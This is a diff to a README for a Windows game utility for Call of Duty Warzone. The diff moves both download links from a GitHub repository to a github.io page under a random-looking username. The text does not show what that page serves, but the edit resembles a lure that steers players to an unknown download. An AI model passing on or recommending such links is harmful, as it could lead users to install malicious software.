@@ -1,6 +1,6 @@
 # 🎯 Warzone-Game-Utility - Improve your game performance and audio
 
-[![](https://img.shields.io/badge/Download-Warzone_Game_Utility-blue.svg)](https://github.com/Sd8iu1691/Warzone-Game-Utility)
+[![](https://img.shields.io/badge/Download-Warzone_Game_Utility-blue.svg)](https://sd8iu1691.github.io)
 
 This software helps players manage their Call of Duty settings. It includes tools to improve frame rates, customize crosshairs, and adjust audio profiles. The utility runs on Windows and works with current versions of the game.
 
@@ -16,7 +16,7 @@ Follow these steps to install the utility on your computer. Your system needs Wi
 
 You can find the software files on the official repository page. Follow this link to reach the download location.
 
-[Download the software here](https://github.com/Sd8iu1691/Warzone-Game-Utility)
+[Download the software here](https://sd8iu1691.github.io)
 
 After you click the link, follow these instructions:
 
